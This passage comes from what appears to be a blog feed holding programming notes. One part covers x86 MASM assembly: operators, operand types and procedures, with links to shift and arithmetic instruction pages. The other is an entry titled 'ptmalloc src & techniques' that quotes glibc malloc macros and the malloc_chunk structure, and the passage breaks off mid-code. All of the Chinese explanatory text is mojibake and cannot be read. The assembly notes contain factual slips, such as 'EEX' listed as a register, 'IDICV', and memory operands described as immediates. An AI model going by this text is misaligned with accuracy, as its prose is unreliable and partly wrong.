code-wrapper"><pre><code class="hljs asm">name TEXTEQU &lt;text&gt;            # å°±æ˜¯æ–‡æœ¬<br>name TEXTEQU textmacro        # å‰é¢çš„æ–‡æœ¬å®<br>name TEXTEQU %constExpr        # æ•´æ•°è¡¨è¾¾å¼<br></code></pre></div></td></tr></table></figure></li></ul><h3 id="ç›¸å…³æŒ‡ä»¤"><a href="#ç›¸å…³æŒ‡ä»¤" class="headerlink" title="ç›¸å…³æŒ‡ä»¤"></a>ç›¸å…³æŒ‡ä»¤</h3><p>æ“ä½œæ•°æœ‰ 3 ç§åŸºæœ¬ç±»å‹ï¼š</p><ul><li>ç«‹å³æ•°â€”â€”ç”¨æ•°å­—æ–‡æœ¬è¡¨è¾¾å¼</li><li>å¯„å­˜å™¨æ“ä½œæ•°â€”â€”ä½¿ç”¨ CPU å†…å·²å‘½åçš„å¯„å­˜å™¨</li><li>å†…å­˜æ“ä½œæ•°â€”â€”å¼•ç”¨å†…å­˜ä½ç½®</li></ul><table><thead><tr><th>æ“ä½œæ•°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>reg8</td><td>8 ä½é€šç”¨å¯„å­˜å™¨ï¼šAHã€ALã€BHã€BLã€CHã€CLã€DHã€DL</td></tr><tr><td>reg16</td><td>16 ä½é€šç”¨å¯„å­˜å™¨ï¼šAXã€BXã€CXã€DXã€SIã€DIã€SPã€BP</td></tr><tr><td>reg32</td><td>32 ä½é€šç”¨å¯„å­˜å™¨ï¼šEAXã€EEXã€ECXã€EDXã€ESIã€EDIã€ESPã€EBP</td></tr><tr><td>reg</td><td>é€šç”¨å¯„å­˜å™¨</td></tr><tr><td>sreg</td><td>16 ä½æ®µå¯„å­˜å™¨ï¼šCSã€DSã€SSã€ESã€FSã€GS</td></tr><tr><td>imm</td><td>8 ä½ã€16 ä½æˆ– 32 ä½ç«‹å³æ•°</td></tr><tr><td>imm8</td><td>8 ä½ç«‹å³æ•°ï¼Œå­—èŠ‚å‹æ•°å€¼</td></tr><tr><td>imm16</td><td>16 ä½ç«‹å³æ•°ï¼Œå­—ç±»å‹æ•°å€¼</td></tr><tr><td>imm32</td><td>32 ä½ç«‹å³æ•°ï¼ŒåŒå­—å‹æ•°å€¼</td></tr><tr><td>reg/mem8</td><td>8 ä½æ“ä½œæ•°ï¼Œå¯ä»¥æ˜¯ 8 ä½é€šç”¨å¯„å­˜å™¨æˆ–å†…å­˜å­—èŠ‚</td></tr><tr><td>reg/mem16</td><td>16 ä½ç«‹å³æ•°ï¼Œå¯ä»¥æ˜¯ 16 ä½é€šç”¨å¯„å­˜å™¨æˆ–å†…å­˜å­—</td></tr><tr><td>reg/mem32</td><td>32 ä½ç«‹å³æ•°ï¼Œå¯ä»¥æ˜¯ 32 ä½é€šç”¨å¯„å­˜å™¨æˆ–å†…å­˜åŒå­—</td></tr><tr><td>mem</td><td>8ä½ã€16 ä½æˆ– 32 ä½å†…å­˜æ“ä½œæ•°</td></tr></tbody></table><hr><p>4.9 <a href="http://c.biancheng.net/view/3514.html">OFFSETè¿ç®—ç¬¦</a> : è¡¨ç¤ºçš„æ˜¯è¯¥æ•°æ®æ ‡å·è·ç¦»æ•°æ®æ®µèµ·å§‹åœ°å€çš„è·ç¦»</p><p>4.10 <a href="http://c.biancheng.net/view/3515.html">ALIGNä¼ªæŒ‡ä»¤</a> 1,2,4,8,16å­—èŠ‚å¯¹é½</p><p>4.11 <a href="http://c.biancheng.net/view/3516.html">PTRè¿ç®—ç¬¦</a> </p><ul><li><p><code>mov ax,WORD PTR myDouble</code>, æŠŠä¸€ä¸ªDWORDçš„ä½ä¸¤å­—èŠ‚ä¼ å…¥ax(å› ä¸ºæ˜¯å°ç«¯æ³•å­˜å‚¨, è€Œä¸”å¯ç”¨åç§»æ¥ä¼ å…¥<br>é«˜ä¸¤å­—èŠ‚:<code>mov ax,WORD PTR [myDouble+2]</code>)</p></li><li><p>æŠŠä¸¤ä¸ªå°çš„ç§»å…¥å¤§çš„: </p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">wordList WORD 5678h,1234h<br>mov eax, DWORD PTR wordList<br></code></pre></div></td></tr></table></figure></li></ul><p>4.12 <a href="http://c.biancheng.net/view/3517.html">TYPEè¿ç®—ç¬¦</a> è¿”å›å˜é‡çš„å¤§å°</p><p>4.13 <a href="http://c.biancheng.net/view/3518.html">LENGTHOFè¿ç®—ç¬¦ </a> è®¡ç®—æ•°ç»„ä¸­å…ƒç´ çš„ä¸ªæ•°, å¦‚æœæ•°ç»„å æ®å¤šè¡Œ, åªè®¡ç®—ç¬¬ä¸€è¡Œ</p><p>4.14 <a href="http://c.biancheng.net/view/3519.html">LABELä¼ªæŒ‡ä»¤</a> å¯ä»¥æ’å…¥ä¸€ä¸ªæ ‡å·ï¼Œå¹¶å®šä¹‰å®ƒçš„å¤§å°å±æ€§ï¼Œä½†æ˜¯ä¸ä¸ºè¿™ä¸ªæ ‡å·åˆ†é…å­˜å‚¨ç©ºé—´<br>        <code>LongValue LABEL DWORD</code> æ ‡è¯†ä¸‹ä¸€ä¸ªåœ°å€å¼€å§‹çš„DWORDå­—èŠ‚</p><p>4.15 <a href="http://c.biancheng.net/view/3525.html">é—´æ¥å¯»å€</a> ç‰¹æ®Š: <code>inc BYTE PTR [esi]</code> è¦åŠ æŒ‡é’ˆçš„ç±»å‹, å‰©ä¸‹çš„æœ‰å¾ˆå¤š, è¯¦è§ç½‘ç«™</p><p>4.16 <a href="http://c.biancheng.net/view/3528.html">JMPå’ŒLOOPæŒ‡ä»¤</a> è¿™ä¸ªloopé›†æˆäº†ECXä»¥åŠå…¶ä»–ä¸€äº›æŒ‡ä»¤, è¦çœ‹çš„è¯è¯¦è§ç½‘ç«™</p><h2 id="æ±‡ç¼–è¯­è¨€è¿‡ç¨‹"><a href="#æ±‡ç¼–è¯­è¨€è¿‡ç¨‹" class="headerlink" title="æ±‡ç¼–è¯­è¨€è¿‡ç¨‹"></a>æ±‡ç¼–è¯­è¨€è¿‡ç¨‹</h2><ul><li><p>å‹æ ˆå‡ºæ ˆ, push&amp;pop</p></li><li><p>PUSHFD å’Œ POPFD æŒ‡ä»¤: å‹å…¥å’Œå¼¹å‡ºEFLAGSå¯„å­˜å™¨</p></li><li><p>PUSHA (push all-16bits), PUSHAD (push all double-32bits),  POPAD å’Œ POPA</p></li><li><p><strong>PROCå’ŒENDP ï¼šå®šä¹‰ä¸€ä¸ªè¿‡ç¨‹</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">main PROC<br>.<br>.<br>main ENDP<br></code></pre></div></td></tr></table></figure><ul><li>æ ‡å·åªæœ‰è¿‡ç¨‹ä¸­çš„æœ‰æ•ˆ, ä¸è¿‡ä¹Ÿå¯ä»¥å®šä¹‰å…¨å±€æ ‡å·<code>Destination::</code>, ä½¿ç”¨ä¸¤ä¸ªå¼•å·å³å¯, å°½é‡å°‘ç”¨</li></ul></li><li><p>USES è¿ç®—ç¬¦: åœ¨PROC ä¼ªæŒ‡ä»¤ä¸€è¡Œåé¢æŒ‡å‡ºå½“å‰è¿‡ç¨‹è¦ä¿®æ”¹çš„å¯„å­˜å™¨, æ±‡ç¼–å™¨åœ¨å¤´å°¾è‡ªåŠ¨ç”Ÿæˆpushå’ŒpopæŒ‡ä»¤, åªå¯¹æ±‡ç¼–å™¨æœ‰æ•ˆ</p></li><li><p>é“¾æ¥åº“è·³è¿‡</p></li></ul><h2 id="æ¡ä»¶åˆ¤æ–­"><a href="#æ¡ä»¶åˆ¤æ–­" class="headerlink" title="æ¡ä»¶åˆ¤æ–­"></a>æ¡ä»¶åˆ¤æ–­</h2><table><thead><tr><th>æ“ä½œ</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>AND</td><td>æºæ“ä½œæ•°å’Œç›®çš„æ“ä½œæ•°è¿›è¡Œé€»è¾‘ä¸æ“ä½œ</td></tr><tr><td>OR</td><td>æºæ“ä½œæ•°å’Œç›®çš„æ“ä½œæ•°è¿›è¡Œé€»è¾‘æˆ–æ“ä½œ</td></tr><tr><td>XOR</td><td>æºæ“ä½œæ•°å’Œç›®çš„æ“ä½œæ•°è¿›è¡Œé€»è¾‘å¼‚æˆ–æ“ä½œ</td></tr><tr><td>NOT</td><td>å¯¹ç›®æ ‡æ“ä½œæ•°è¿›è¡Œé€»è¾‘éæ“ä½œ</td></tr><tr><td>TEST</td><td>æºæ“ä½œæ•°å’Œç›®çš„æ“ä½œæ•°è¿›è¡Œé€»è¾‘ä¸æ“ä½œï¼Œå¹¶é€‚å½“åœ°è®¾ç½® CPU æ ‡å¿—ä½</td></tr></tbody></table><ul><li>ç½®ä½å’Œæ¸…é™¤é›¶æ ‡å¿—ä½ã€ç¬¦å·æ ‡å¿—ä½ã€è¿›ä½æ ‡å¿—ä½å’Œæº¢å‡ºæ ‡å¿—ä½çš„<a href="http://c.biancheng.net/view/3563.html">æ–¹æ³•</a> </li><li>æ±‡ç¼–è¯­è¨€64ä½æ¨¡å¼ä¸‹çš„å¸ƒå°”æŒ‡ä»¤: <ul><li>32 ä½æ“ä½œæ•°æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„æƒ…å†µï¼Œéœ€è¦ä¸å…¶ä»–å¤§å°æ“ä½œæ•°çš„æƒ…å†µåˆ†å¼€è€ƒè™‘ã€‚</li></ul></li><li>æ¡ä»¶è·³è½¬<ul><li>æ³¨æ„æ— ç¬¦å·æ•°å’Œæœ‰ç¬¦å·æ•°çš„æ¯”è¾ƒæ˜¯ä¸åŒçš„.</li><li></li></ul></li><li>â€¦</li></ul><h2 id="æ•´æ•°è¿ç®—"><a href="#æ•´æ•°è¿ç®—" class="headerlink" title="æ•´æ•°è¿ç®—"></a>æ•´æ•°è¿ç®—</h2><ol><li><p><a href="http://c.biancheng.net/view/3589.html">æ±‡ç¼–è¯­è¨€ç§»ä½å’Œå¾ªç¯ç§»ä½æŒ‡ä»¤ç®€ä»‹</a> </p></li><li><p><a href="http://c.biancheng.net/view/3590.html">æ±‡ç¼–è¯­è¨€SHLï¼ˆå·¦ç§»ï¼‰æŒ‡ä»¤ï¼šå°†æ“ä½œæ•°é€»è¾‘å·¦ç§»ä¸€ä½</a> </p></li><li><p><a href="http://c.biancheng.net/view/3591.html">æ±‡ç¼–è¯­è¨€SHRï¼ˆå³ç§»ï¼‰æŒ‡ä»¤ï¼šå°†æ“ä½œæ•°é€»è¾‘å³ç§»ä¸€ä½</a> </p></li><li><p><a href="http://c.biancheng.net/view/3592.html">æ±‡ç¼–è¯­è¨€SALï¼ˆç®—æœ¯å·¦ç§»ï¼‰å’ŒSARï¼ˆç®—æœ¯å³ç§»ï¼‰æŒ‡ä»¤ï¼šå°†æ“ä½œæ•°å·¦</a> </p></li><li><p><a href="http://c.biancheng.net/view/3593.html">æ±‡ç¼–è¯­è¨€ROLï¼ˆå¾ªç¯å·¦ç§»ï¼‰æŒ‡ä»¤ï¼šå°†æ“ä½œæ•°æ‰€æœ‰ä½éƒ½å‘å·¦ç§»</a> </p></li><li><p><a href="http://c.biancheng.net/view/3595.html">æ±‡ç¼–è¯­è¨€RORï¼ˆå¾ªç¯å³ç§»ï¼‰æŒ‡ä»¤ï¼šå°†æ“ä½œæ•°æ‰€æœ‰ä½éƒ½å‘å³ç§»</a> </p></li><li><p><a href="http://c.biancheng.net/view/3596.html">æ±‡ç¼–è¯­è¨€RCLï¼ˆå¸¦è¿›ä½å¾ªç¯å·¦ç§»ï¼‰å’ŒRCRï¼ˆå¸¦è¿›ä½å¾ªç¯å³ç§»ï¼‰æŒ‡ä»¤</a> </p></li><li><p><a href="http://c.biancheng.net/view/3597.html">æ±‡ç¼–è¯­è¨€SHLDï¼ˆåŒç²¾åº¦å·¦ç§»ï¼‰å’ŒSHRDï¼ˆåŒç²¾åº¦å³ç§»ï¼‰æŒ‡ä»¤</a> </p></li><li><p><a href="http://c.biancheng.net/view/3600.html">æ±‡ç¼–è¯­è¨€ç§»ä½å’Œå¾ªç¯ç§»ä½çš„åº”ç”¨</a> </p></li><li><p><a href="http://c.biancheng.net/view/3602.html">æ±‡ç¼–è¯­è¨€MULæŒ‡ä»¤ï¼šæ— ç¬¦å·æ•°ä¹˜æ³•</a> </p></li><li><p><a href="http://c.biancheng.net/view/3603.html">æ±‡ç¼–è¯­è¨€IMULæŒ‡ä»¤ï¼šæœ‰ç¬¦å·æ•°ä¹˜æ³•</a> </p></li><li><p><a href="http://c.biancheng.net/view/3605.html">æ±‡ç¼–è¯­è¨€GetMsecondsï¼šæµ‹é‡ç¨‹åºæ‰§è¡Œæ—¶é—´</a> </p></li><li><p><a href="http://c.biancheng.net/view/3606.html">æ±‡ç¼–è¯­è¨€DIVæŒ‡ä»¤ï¼šæ— ç¬¦å·é™¤æ³•</a> </p></li><li><p><a href="http://c.biancheng.net/view/3609.html">æ±‡ç¼–è¯­è¨€IDICVæŒ‡ä»¤ï¼šæœ‰ç¬¦å·æ•°é™¤æ³•</a> </p></li><li><p><a href="http://c.biancheng.net/view/3610.html">ä½¿ç”¨æ±‡ç¼–è¯­è¨€å®ç°ç®—æœ¯è¡¨è¾¾å¼[å®ä¾‹]</a> </p></li><li><p><a href="http://c.biancheng.net/view/3611.html">æ±‡ç¼–è¯­è¨€ADCæŒ‡ä»¤ï¼šå¸¦è¿›ä½åŠ æ³•</a> </p></li><li><p><a href="http://c.biancheng.net/view/3612.html">æ±‡ç¼–è¯­è¨€SBBæŒ‡ä»¤ï¼šå¸¦å€Ÿä½å‡æ³•</a> </p></li><li><p><a href="http://c.biancheng.net/view/3614.html">æ±‡ç¼–è¯­è¨€ASCIIå’Œéå‹ç¼©åè¿›åˆ¶è¿ç®—</a> </p></li><li><p><a href="http://c.biancheng.net/view/3615.html">æ±‡ç¼–è¯­è¨€AAAæŒ‡ä»¤ï¼šè°ƒæ•´ADDæˆ–ADCæŒ‡ä»¤çš„äºŒè¿›åˆ¶è¿ç®—ç»“æœ </a> </p></li><li><p><a href="http://c.biancheng.net/view/3616.html">æ±‡ç¼–è¯­è¨€AASæŒ‡ä»¤ï¼šå‡æ³•åçš„ASXIIè°ƒæ•´</a> </p></li><li><p><a href="http://c.biancheng.net/view/3617.html">æ±‡ç¼–è¯­è¨€AAMï¼ˆä¹˜æ³•åçš„ASCIIè°ƒæ•´ï¼‰å’ŒAADï¼ˆé™¤æ³•ä¹‹å‰çš„ASCIIè°ƒæ•´ï¼‰æŒ‡</a> </p></li><li><p><a href="http://c.biancheng.net/view/3619.html">æ±‡ç¼–è¯­è¨€å‹ç¼©åè¿›åˆ¶è¿ç®—ç®€ä»‹</a> </p></li><li><p><a href="http://c.biancheng.net/view/3621.html">æ±‡ç¼–è¯­è¨€DAAæŒ‡ä»¤ï¼šåŠ æ³•åçš„åè¿›åˆ¶è°ƒæ•´</a> </p></li><li><p><a href="http://c.biancheng.net/view/3622.html">æ±‡ç¼–è¯­è¨€DASæŒ‡ä»¤ï¼šå‡æ³•åçš„åè¿›åˆ¶è°ƒæ•´</a> </p></li></ol><h2 id="æ±‡ç¼–è¯­è¨€é«˜çº§è¿‡ç¨‹"><a href="#æ±‡ç¼–è¯­è¨€é«˜çº§è¿‡ç¨‹" class="headerlink" title="æ±‡ç¼–è¯­è¨€é«˜çº§è¿‡ç¨‹"></a>æ±‡ç¼–è¯­è¨€é«˜çº§è¿‡ç¨‹</h2>]]></content>
    
    
    <categories>
      
      <category>programming_language</category>
      
    </categories>
    
    
    <tags>
      
      <tag>programming_language</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ptmalloc src &amp; techniques</title>
    <link href="/2021-08/Now-ptmalloc-exp/"/>
    <url>/2021-08/Now-ptmalloc-exp/</url>
    
    <content type="html"><![CDATA[<h1 id="åŸºæœ¬æ•°æ®ç»“æ„åŠå‡½æ•°"><a href="#åŸºæœ¬æ•°æ®ç»“æ„åŠå‡½æ•°" class="headerlink" title="åŸºæœ¬æ•°æ®ç»“æ„åŠå‡½æ•°"></a>åŸºæœ¬æ•°æ®ç»“æ„åŠå‡½æ•°</h1><h2 id="ç®¡ç†chunk"><a href="#ç®¡ç†chunk" class="headerlink" title="ç®¡ç†chunk"></a>ç®¡ç†chunk</h2><h3 id="Size-and-alignment-checks-and-conversions"><a href="#Size-and-alignment-checks-and-conversions" class="headerlink" title="Size and alignment checks and conversions"></a>Size and alignment <code>checks</code> and conversions</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* conversion from malloc headers to user pointers, and back */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))</span><br><span class="hljs-comment">/* The smallest possible chunk */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))</span><br><span class="hljs-comment">/* The smallest size we can malloc is an aligned minimal chunk */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MINSIZE  \</span><br><span class="hljs-meta">  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="hljs-comment">/* Check if m has acceptable alignment */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> misaligned_chunk(p) \</span><br><span class="hljs-meta">  ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem (p)) \</span><br><span class="hljs-meta">   &amp; MALLOC_ALIGN_MASK)</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Check if a request is so large that it would wrap around zero when</span><br><span class="hljs-comment">   padded and aligned. To simplify some other code, the bound is made</span><br><span class="hljs-comment">   low enough so that adding MINSIZE will also not wrap around zero.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                 \</span><br><span class="hljs-meta">  ((unsigned long) (req) &gt;=                                                      \</span><br><span class="hljs-meta">   (unsigned long) (INTERNAL_SIZE_T) (-2 * MINSIZE))</span><br><span class="hljs-comment">/* pad request bytes into a usable size -- internal version */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> request2size(req)                                         \</span><br><span class="hljs-meta">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span><br><span class="hljs-meta">   MINSIZE :                                                      \</span><br><span class="hljs-meta">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br><span class="hljs-comment">/* Same, except also perform an argument and result check.  First, we check</span><br><span class="hljs-comment">   that the padding done by request2size didn&#x27;t result in an integer</span><br><span class="hljs-comment">   overflow.  Then we check (using REQUEST_OUT_OF_RANGE) that the resulting</span><br><span class="hljs-comment">   size isn&#x27;t so large that a later alignment would lead to another integer</span><br><span class="hljs-comment">   overflow.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> checked_request2size(req, sz) \</span><br><span class="hljs-meta">(&#123;                                    \</span><br><span class="hljs-meta">  (sz) = request2size (req);            \</span><br><span class="hljs-meta">  <span class="hljs-meta-keyword">if</span> (((sz) &lt; (req))                    \</span><br><span class="hljs-meta">      || REQUEST_OUT_OF_RANGE (sz)) \</span><br><span class="hljs-meta">    &#123;                                    \</span><br><span class="hljs-meta">      __set_errno (ENOMEM);            \</span><br><span class="hljs-meta">      return 0;                            \</span><br><span class="hljs-meta">    &#125;                                    \</span><br><span class="hljs-meta">&#125;)</span><br></code></pre></div></td></tr></table></figure><h3 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a><a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#malloc_chunk">malloc_chunk</a></h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*  chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-comment">            |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="hljs-comment">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-comment">            |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="hljs-comment">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-comment">            |             User data starts here...                          .</span><br><span class="hljs-comment">            .                                                               .</span><br><span class="hljs-comment">            .             (malloc_usable_size() bytes)                      .</span><br><span class="hljs-comment">            .                                                               |</span><br><span class="hljs-comment">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-comment">            |             (size of chunk, but used for application data)    |</span><br><span class="hljs-comment">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-comment">            |             Size of next chunk, in bytes                |A|0|1|</span><br><span class="hljs-comment">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> &#123;</span><br>  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="hljs-comment">/* Size of previous chunk (if free).  */</span><br>  INTERNAL_SIZE_T      mchunk_size;       <span class="hljs-comment">/* Size in bytes, including overhead. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd</span>;</span>         <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk</span>;</span><br>  <span class="hljs-comment">/* Only used for large blocks: pointer to next larger size.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd_nextsize</span>;</span> <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk_nextsize</span>;</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p><strong>MALLOC_ALIGNMENT</strong>åœ¨32å’Œ64ä½æœºä¸Šåˆ†åˆ«ä¸º8å’Œ16å­—èŠ‚, è¢«å®šä¹‰ä¸º<code>2 * SIZE_SZ</code> å’Œ <code>__alignof__ (long double)</code>ä¸­çš„è¾ƒå¤§è€….<br><strong>MALLOC_ALIGN_MASK</strong>å®šä¹‰ä¸ºMALLOC_ALIGNMENT - 1, åœ¨64ä½ä¸Šæ˜¯0b1111.<br><strong>MIN_CHUNK_SIZE</strong>æ˜¯fd_nextsizeæŒ‡é’ˆä¹‹å‰çš„éƒ¨åˆ†.<br><strong>MINSIZE</strong> = <code>(unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</code> å³å¯å®Œæˆå—å¤§å°çš„16ä½å¯¹é½.</p><p>è¿™æ ·, åœ¨64ä½ç³»ç»Ÿä¸ŠMINSIZEå°±æ˜¯32(0x20)å­—èŠ‚.</p><p><strong>tips</strong>: <code># define INTERNAL_SIZE_T size_t</code>  åˆ†åˆ«ä¸º4æˆ–8å­—èŠ‚</p><h3 id="chunk-operations"><a href="#chunk-operations" class="headerlink" title="chunk operations"></a><a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#1229">chunk operations</a></h3><p>æ²¡å•¥ç‰¹åˆ«çš„, å¦‚æœæœ‰éœ€è¦çš„è¯éšæ—¶æŸ¥æ‰¾å³å¯</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* size field is or&#x27;ed with PREV_INUSE when previous adjacent chunk in use */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PREV_INUSE 0x1</span><br><span class="hljs-comment">/* extract inuse bit of previous chunk */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> prev_inuse(p)       ((p)-&gt;mchunk_size &amp; PREV_INUSE)</span><br><span class="hljs-comment">/* size field is or&#x27;ed with IS_MMAPPED if the chunk was obtained with mmap() */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IS_MMAPPED 0x2</span><br><span class="hljs-comment">/* check for mmap()&#x27;ed chunk */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunk_is_mmapped(p) ((p)-&gt;mchunk_size &amp; IS_MMAPPED)</span><br><span class="hljs-comment">/* size field is or&#x27;ed with NON_MAIN_ARENA if the chunk was obtained</span><br><span class="hljs-comment">   from a non-main arena.  This is only set immediately before handing</span><br><span class="hljs-comment">   the chunk to the user, if necessary.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NON_MAIN_ARENA 0x4</span><br><span class="hljs-comment">/* Check for chunk from main arena.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunk_main_arena(p) (((p)-&gt;mchunk_size &amp; NON_MAIN_ARENA) == 0)</span><br><span class="hljs-comment">/* Mark a chunk as not being on the main arena.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_non_main_arena(p) ((p)-&gt;mchunk_size |= NON_MAIN_ARENA)</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Bits to mask off when extracting size</span><br><span class="hljs-comment">   Note: IS_MMAPPED is intentionally not masked off from size field in</span><br><span class="hljs-comment">   macros for which mmapped chunks should never be seen. This should</span><br><span class="hljs-comment">   cause helpful core dumps to occur if it is tried by accident by</span><br><span class="hljs-comment">   people extending or adapting this malloc.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span 